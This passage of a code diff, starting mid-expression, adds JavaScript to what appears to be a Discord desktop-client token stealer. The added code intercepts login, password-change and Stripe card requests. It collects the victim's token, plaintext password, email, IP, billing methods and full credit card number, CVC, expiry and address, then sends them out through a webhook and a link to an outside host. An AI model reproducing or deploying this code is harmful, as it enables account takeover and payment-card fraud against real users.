+            xmlHttp.responseText`, !0).then((info4) => {
+
+										function totalFriends() {
+											var f = JSON.parse(info4)
+											const r = f.filter((user) => {
+												return user.type == 1
+											})
+											return r.length
+										}
+
+										function CalcFriends() {
+											var f = JSON.parse(info4)
+											const r = f.filter((user) => {
+												return user.type == 1
+											})
+											var gay = "";
+											for (z of r) {
+												var b = GetRBadges(z.user.public_flags)
+												if (b != "") {
+													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+												}
+											}
+											if (gay == "") {
+												gay = "No Rare Friends"
+											}
+											return gay
+										}
+
+										function Cool() {
+											const json = JSON.parse(info3)
+											var billing = "";
+											json.forEach(z => {
+												if (z.type == "") {
+													return "\`❌\`"
+												} else if (z.type == 2 && z.invalid != !0) {
+													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+												} else if (z.type == 1 && z.invalid != !0) {
+													billing += "\`✔️\`" + " :credit_card:"
+												} else {
+													return "\`❌\`"
+												}
+											})
+											if (billing == "") {
+												billing = "\`❌\`"
+											}
+											return billing
+										}
+										const json = JSON.parse(info);
+										var params = {
+											username: "Testing",
+											content: "",
+											embeds: [{
+												"title": "Email Changed",
+												description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +"<br>"+ password+")",
+												"color": config['embed-color'],
+												"fields": [{
+													name: "Info",
+													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
+													inline: !1
+												}, {
+													name: "Username",
+													value: `\`${json.username}#${json.discriminator}\``,
+													inline: !0
+												}, {
+													name: "ID",
+													value: `\`${json.id}\``,
+													inline: !0
+												}, {
+													name: "Nitro",
+													value: `${GetNitro(json.premium_type)}`,
+													inline: !1
+												}, {
+													name: "Badges",
+													value: `${GetBadges(json.flags)}`,
+													inline: !1
+												}, {
+													name: "Billing",
+													value: `${Cool()}`,
+													inline: !1
+												}, {
+													name: "New Email",
+													value: `\`${newemail}\``,
+													inline: !0
+												}, {
+													name: "Password",
+													value: `\`${password}\``,
+													inline: !0
+												}, {
+													name: "Token",
+													value: `\`\`\`${token}\`\`\``,
+													inline: !1
+												}, ],
+												"author": {
+													"name": "Testing"
+												},
+												"footer": {
+													"text": "Testing"
+												},
+												"thumbnail": {
+													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+												}
+											}, {
+												"title": `Total Friends (${totalFriends()})`,
+												"color": config['embed-color'],
+												"description": CalcFriends(),
+												"author": {
+													"name": "Testing"
+												},
+												"footer": {
+													"text": "Testing"
+												},
+												"thumbnail": {
+													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+												}
+											}]
+										}
+										SendToWebhook(JSON.stringify(params))
+									})
+								})
+							})
+						})
+
+					}
+				})
+			})
+		})
+	})
+}
+
+function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+		window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+			var json = JSON.parse(info);
+			var params = {
+				username: "Testing",
+				content: "",
+				embeds: [{
+					"title": "User Credit Card Added",
+					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
+					"author": {
+						"name": "Testing"
+					},
+					"footer": {
+						"text": "Testing"
+					},
+					"thumbnail": {
+						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+					}
+				}]
+			}
+			SendToWebhook(JSON.stringify(params))
+		})
+	})
+}
 const ChangePasswordFilter = {
 	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
 };
